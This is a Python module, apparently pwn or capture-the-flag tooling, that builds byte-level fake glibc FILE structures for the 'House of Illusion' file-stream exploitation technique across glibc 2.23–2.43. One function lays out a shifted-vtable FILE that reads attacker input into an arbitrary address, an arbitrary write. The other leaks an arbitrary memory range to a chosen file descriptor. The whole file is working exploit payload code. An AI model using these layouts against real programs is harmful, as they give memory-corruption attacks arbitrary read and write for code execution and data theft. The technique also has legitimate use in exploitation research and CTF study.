"""House of Illusion normal and shifted FILE sink layouts."""
from __future__ import annotations
from dataclasses import dataclass

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or isinstance(v, bool) or not 0 <= v < 1 << 64:
        raise ValueError("address must be an unsigned 64-bit integer")
    return v.to_bytes(8, "little")

def _base(file_addr: int, file_jumps_addr: int, lock_addr: int, fd: int,
          target_addr: int, length: int, flags: int) -> bytearray:
    if fd < 0 or fd >= 1 << 32 or length <= 0:
        raise ValueError("invalid fd or length")
    end = target_addr + length
    if not 0 <= target_addr < 1 << 64 or end >= 1 << 64:
        raise ValueError("target range overflows")
    file = bytearray(0xe0)
    file[0:8] = flags.to_bytes(8, "little")
    file[0x68:0x70] = _p(lock_addr)
    file[0x70:0x74] = fd.to_bytes(4, "little")
    file[0x78:0x80] = _p(0)
    file[0x20:0x28] = _p(target_addr)
    file[0x28:0x30] = _p(end)
    file[0x30:0x38] = _p(end)
    file[0x38:0x40] = _p(target_addr)
    file[0x40:0x48] = _p(end)
    file[0xd8:0xe0] = _p(file_jumps_addr)
    return file

def build_illusion_shifted_write(version: str, *, file_addr: int,
                                  file_jumps_addr: int, lock_addr: int,
                                  fd: int, target_addr: int, length: int,
                                  io_list_all_addr: int | None = None) -> tuple[MemoryWrite, ...]:
    """生成 shifted vtable 的 fd -> target 任意写布局。

    version: 2.23～2.39 不需要 `_prevchain`，2.40～2.43 必须提供链表头槽地址。
    file_addr/lock_addr/fd/target_addr/length: fake FILE、锁、输入 fd 和 read 区间。
    file_jumps_addr: `_IO_file_jumps`，函数写入 `file_jumps - 8`。
    io_list_all_addr: 2.40+ fake 头节点的 `_prevchain`，通常是 `_IO_list_all` 地址。
    """
    if version not in {f"2.{i}" for i in range(23, 44)}:
        raise ValueError("House of Illusion supports glibc 2.23 through 2.43")
    flags = 0x80 | 0x40 | 0x1000
    file = _base(file_addr, file_jumps_addr, lock_addr, fd, target_addr, length, flags)
    file[0xd8:0xe0] = _p(file_jumps_addr - 8)
    if version >= "2.40":
        if io_list_all_addr is None:
            raise ValueError("2.40+ requires io_list_all_addr")
        file[0xb8:0xc0] = _p(io_list_all_addr)
    return (MemoryWrite(file_addr, bytes(file), f"shifted FILE ({version})"),)

def build_illusion_normal_read(version: str, *, file_addr: int,
                               file_jumps_addr: int, lock_addr: int,
                               output_fd: int, target_addr: int, length: int,
                               io_list_all_addr: int | None = None) -> tuple[MemoryWrite, ...]:
    """生成正常 `_IO_file_jumps` 的 target -> fd 任意读布局。

    version: 仅用于 2.40+ `_prevchain` 分支。
    output_fd: 目标泄露数据写入的 fd；target_addr/length 是输出区间。
    其余地址参数含义同 `build_illusion_shifted_write`。
    """
    if version not in {f"2.{i}" for i in range(23, 44)}:
        raise ValueError("House of Illusion supports glibc 2.23 through 2.43")
    file = _base(file_addr, file_jumps_addr, lock_addr, output_fd, target_addr, length, 0x80 | 0x800 | 0x1000)
    file[0xd8:0xe0] = _p(file_jumps_addr)
    file[0x18:0x20] = _p(target_addr)
    file[0x40:0x48] = _p(target_addr + length)
    if version >= "2.40":
        if io_list_all_addr is None:
            raise ValueError("2.40+ requires io_list_all_addr")
        file[0xb8:0xc0] = _p(io_list_all_addr)
    return (MemoryWrite(file_addr, bytes(file), f"normal FILE ({version})"),)
